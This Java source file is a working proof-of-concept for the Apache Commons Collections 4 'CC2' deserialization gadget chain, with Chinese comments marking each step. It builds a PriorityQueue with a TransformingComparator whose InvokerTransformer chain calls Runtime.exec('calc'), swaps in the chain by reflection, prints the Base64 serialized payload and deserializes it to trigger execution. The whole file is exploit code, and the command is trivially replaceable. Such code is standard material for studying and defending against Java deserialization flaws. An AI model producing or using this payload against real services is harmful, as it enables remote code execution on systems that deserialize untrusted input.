/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
public class CC2 {
    public static void main(String[] args) throws Exception{
        //创建 ChainedTransformer实例
        Transformer[] faketransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[] { String.class, Class[].class },
                new Object[] { "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke",
                new Class[] { Object.class, Object[].class },
                new Object[] { null, new Object[0] }),
            new InvokerTransformer("exec",
                new Class[] { String.class },
                new String[] { "calc" }),
        };
        ChainedTransformer chain = new ChainedTransformer(faketransformers);
        //创建TranformingComparator 实例
        Comparator comparator = new TransformingComparator(chain);

        //创建 PriorityQueue 实例
        //readobject 入口
        PriorityQueue priorityQueue = new PriorityQueue(2,comparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Field field = chain.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chain,transformers);
        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(priorityQueue);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();
    }
}